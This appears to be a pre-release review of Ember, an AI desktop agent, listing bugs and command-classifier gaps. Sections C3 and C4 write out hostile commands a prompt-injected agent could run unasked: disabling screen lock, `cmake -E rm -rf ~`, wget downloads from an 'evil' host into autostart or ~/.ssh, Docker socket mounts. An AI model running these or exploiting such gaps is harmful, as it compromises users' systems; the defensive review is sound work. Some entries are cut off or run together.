# Ember pre-release review

20 Sonnet reviewers (10 release-readiness, 10 UI/UX) on the release candidate: main with the Windows/macOS port, plus the SSH/WSL/commands branch at 813698b.
277 findings: 3 blocker, 69 major, 133 minor, 72 polish. Merged here into 30 themes covering every blocker and major (127 findings), then the other minor and polish items by area.

Each reviewer read the code end to end and reproduced what it could on Linux (Xvfb, the real AT-SPI sidecar, real voice models, Playwright renders). Windows and macOS items rest on code reading and fakes unless the evidence says otherwise. The findings have not been cross-checked by a second agent; a fix should start by reproducing its finding.

- **The device-flow sign-in dies on one network blip or proxy error page, and promises a retry that does not exist** (minor, rev-agent, high confidence) `app/main/agent/auth.ts:139`
  - What happens: The user has entered the code on github.com. While Ember polls (up to 15 minutes), one fetch fails (Wi-Fi roam, VPN reconnect) or a proxy returns an HTML 502. The whole sign-in aborts. A network error says "Ember can't reach GitHub right now. It will try again when the network is back", but nothing retries a sign-in (only starts are retried). An HTML 502 shows the raw "Unexpected token '<', "<html>…" is not valid JSON". The code the user just approved is lost, and they must start over.

- **`gh auth token` is asked without `--hostname github.com`, so GH_HOST or an enterprise-only login yields a token Copilot can't use** (minor, rev-agent, medium confidence) `app/main/agent/auth.ts:80`
  - What happens: A developer at a company with GitHub Enterprise Server has GH_HOST set, or is logged in only to the enterprise host. `gh auth token` prints that host's token. Ember sends it to Copilot on github.com, which refuses it. The error says the sign-in "may have expired", which is misleading, and Check again cannot help.
  - Evidence: ghCliToken runs `execFile(gh, ["auth","token"], …)` with no host argument. `gh auth token` uses GH_HOST or the default host. By its documented behaviour `--hostname` is the way to choose; I could not run gh here.
  - Fix: Run `gh auth token --hostname github.com` (add `--user` handling if needed), and fall through when that host has no login.

### C2. The handle menu's "Ask Ember…" never opens the ask box

Platforms: all

- **Handle menu "Ask Ember…" never opens the ask box (the menuClosing guard swallows every real pick)** (blocker, ux-ask, high confidence) `app/main/main.ts:532`
  - What happens: A new user, or anyone whose Ctrl+Alt+Space is held by another app (the greeting then says "Click my handle in the corner to ask me something", main.ts:443), clicks the pill and chooses "Ask Ember…". The menu closes, nothing opens, and log says ask.menu_ignored {reason: menu-closing}. Keyboard (Down, Enter) and mouse picks both fail. Only the hotkey still works. On Windows and macOS, where the chord is Win+Alt+Space or Control+Shift+Command+Space, the handle is the likely way to ask, so "Ask" from the handle is dead there too, as far as the code shows.
  - Evidence: Ran the real app under mutter. Wrapped Menu.buildFromTemplate to timestamp events: "MENUTRACE will-close 87938" then "MENUTRACE click 'Ask Ember…' 87939", then log {"msg":"ask.menu_ignored","reason":"menu-closing"}. Electron emits menu-will-close ~1 ms BEFORE the picked item's click, so menuClosing (set at main.ts:565) is always true when the click arrives; the code comment at :527 assumes the opposite. "Stop everything", "Settings…", "Stay put" (no guard) fire normally. Pressing Esc on the men…
  - Fix: Remove the menuClosing guard. The other protections stay: the released() gate before popup, registerAccelerator:false, and the post-close ask.spurious_after_menu hide (which skips real picks because opens is already true). If a guard is still wanted, ignore only clicks that arrive within ~150 ms of menu.popup(), never after menu-will-close. Add an xvfb integration check that picks the first item and expects ask.reveal source=menu.

### C3. Commands that change system settings run without asking: gsettings, dconf and defaults writes (a dead early return in classify.ts)

Platforms: Linux (RHEL 8 is the primary target), macOS

- **run_command runs gsettings, dconf and defaults writes unasked: proxy, screen lock, remote desktop, GNOME Shell extensions, macOS password-after-sleep** (major, rev-safety, high confidence) `app/main/commands/classify.ts:4585`
  - What happens: On RHEL 8 a prompt-injected or confused task calls run_command with `gsettings set org.gnome.system.proxy mode 'manual'` plus a proxy host, `gsettings set org.gnome.desktop.screensaver lock-enabled false`, `gsettings set org.gnome.shell enabled-extensions "['evil@x']"` or `gsettings set org.gnome.desktop.remote-desktop.rdp enable true`. The verdict is run with no card, no announcement. The GUI policy asks about the same settings (proxy, security stems), so the command channel is a way round the 'security settings' rule. On macOS `defaults write com.apple.screensaver askForPassword -int 0` and `defaults write com.apple.alf globalstate -int 0` also run unasked, as do NSS `certutil -A` CA imports on Linux.
  - Evidence: Classifier output through test/fixtures/commands/corpus.runCase (scratchpad e17/e18): every one of those commands gave verdict 'run', 'ordinary'. Their Windows equivalents (netsh winhttp set proxy, Set-MpPreference, reg add ...\Run) all ask. classify.ts:4584-4585 are two early `return`s for gsettings/dconf (the first is dead code after the second); only LSQuarantine is flagged for defaults. No corpus case covers gsettings or dconf; docs mention gsettings only for the WSL a11y fix.
  - Fix: Classify gsettings/dconf writes to security schemas (org.gnome.system.proxy*, desktop.screensaver, desktop.session idle-delay, desktop.lockdown, desktop.remote-desktop*, desktop.privacy, org.gnome.shell enabled-extensions) and defaults writes to com.apple.screensaver/alf/security domains, plus certutil -A, as system.security (ask).   - Evidence: The handler registers gsettings and dconf with the system tools. Line 4584 returns for read verbs and lets set, write, reset and load fall through. Line 4585 `if (h.key === "gsettings" || h.key === "dconf") return;` then returns for those verbs too, so the final `system.kernel` finding never fires. Verdict `run`, no findings, for: gsettings set org.gnome.desktop.screensaver lock-enabled false; dconf write /org/gnome/desktop/screensaver/lock-enabled false; the custom-keybinding command above (ou…
  - Fix: Delete line 4585 so set, reset, reset-recursively, write, load and update reach `h.e.add("system", "system.kernel", ...)`. Better, give gsettings and dconf their own handler: `system.autostart` for media-keys and custom-keybindings, org.gnome.shell enabled-extensions and default-applications; `system.security` for screensaver and lock keys. Add corpus cases.
- **macOS: PlistBuddy, plutil and `defaults write` to ~/Library/LaunchAgents are silent persistence** (minor, rev-security, medium confidence) `app/main/commands/classify.ts:4586`
  - What happens: Redirects, cp, mv, tee, mkdir and ln into ~/Library/LaunchAgents all ask. But `plutil -create xml1 ~/Library/LaunchAgents/x.plist`, `PlistBuddy -c 'Add :ProgramArguments array' ...` and `defaults write ~/Library/LaunchAgents/com.x RunAtLoad -bool true` are silent. A LaunchAgent built this way runs at next login with no `launchctl load` (which is flagged).

The `defaults` branch (line 4586) flags only LSQuarantine and /Library paths. PlistBuddy and plutil have no handler. I judged this from the classifier only. Not run o…

### C4. Classifier gaps let harmful commands run silently: cmake -E deletes, programs run through option values or stdin, path rules skipped for option-value destinations (Ember's own settings included), docker bind mounts, UNC paths (NTLM leak)

Platforms: all

- **`cmake -E` (rm -rf, remove_directory, copy, rename, tar, touch, create_symlink, time, env, chdir) is treated as an ordinary build, so it deletes and overwrites anything silently** (major, rev-security, high confidence) `app/main/commands/classify.ts:1892`
  - What happens: Injected text makes Ember run `cmake -E rm -rf ~/Documents`, or even `cmake -E rm -rf /` or `cmake -E time rm -rf ~`. `rm -rf /` and `rm -rf ~` ask or are refused, but the cmake forms run straight away. `cmake -E copy x ~/.bashrc` and `cmake -E tar xf evil.tar --directory=~/.config/autostart` overwrite startup files and extract into autostart. On WSL the same works against /mnt/c/Users/....
  - Evidence: Verdict `run`, no findings, for cmake -E rm -rf ~/Documents, cmake -E rm -rf /, cmake -E remove_directory /home/ana, cmake -E time rm -rf ~, cmake -E copy x ~/.bashrc, cmake -E tar xf evil.tar --directory=/home/ana/.config/autostart, cmake -E create_symlink /etc/passwd ~/.bashrc. Do the same sweep for other multi-tool binaries (`ninja -t`, `bazel clean`).

- **Path rules are skipped when the destination is an option value: wget -P, aria2c -d, lwp-download, git checkout-index --prefix and worktree add. This includes Ember's own settings** (major, rev-security, high confidence) `app/main/commands/classify.ts:4097`
  - What happens: Injected text makes Ember run `wget -P ~/.config/autostart https://evil/x.desktop`, which is code execution at next login. `wget -P ~/.ssh https://evil/authorized_keys` and `wget -P ~/.local/bin https://evil/ls` are other targets. From WSL, `wget -P /mnt/c/Users/ana/AppData/Roaming/Microsoft/Windows/Start\\ Menu/Programs/Startup https://evil/x.bat` plants a Windows startup file. `wget -P ~/.config/ember -N https://evil/settings.json` (or `--backups=1`) replaces Ember's own settings.json, which the docs say Ember never runs. `git checkout-index -f --prefix=$HOME/.config/ember/ -a` does the same from a repo the model built itself.
  - Evidence: Verdict `run`, no findings, for all of the above (out14.txt, out16.txt, out20.txt, out35.txt). The wget handler parses -P but only calls `h.e.download(dir/name)` and never `usePath(..., "write")` (lines 4097-4127). aria2c/lwp-download (line 4135) ignore `-d` and the destination operand. The git branch (line 3059) drops options like `--prefix`. `git worktree add`, `npm pack --pack-destination` and `go build -o ~/.config/ember/settings.json` are also `run`. Unregistered programs only treat paths…
  - Fix: After a registered handler returns, run a shared pass that sends every option value and operand that looks like a path through usePath: use `write` when the option is a known output flag (-P, --directory-prefix, -d, --dir, -o, --output, --prefix, --pack-destination, -D, -C), `read` otherwise. Make the Ember-path refusal and the startup, autostart and secret lists apply to those paths on every use. Give generic programs the same treatment for -o and --output operands, not only reads.
- **docker/podman: a bind mount is judged as a read only. The Docker socket and system folders can be mounted, and protected host files and folders can be written, silently** (major, rev-security, high confidence) `app/main/commands/classify.ts:3578`
  - What happens: `docker run --rm -v /var/run/docker.sock:/s alpine ...` is root on the host, because the container can start another container mounting `/`. It runs with no card. **rev-voice.** The voice stack is in good shape on Linux. The 470 voice unit tests and the 17-test real-model integration suite pass, and tsc and eslint are clean on the area.
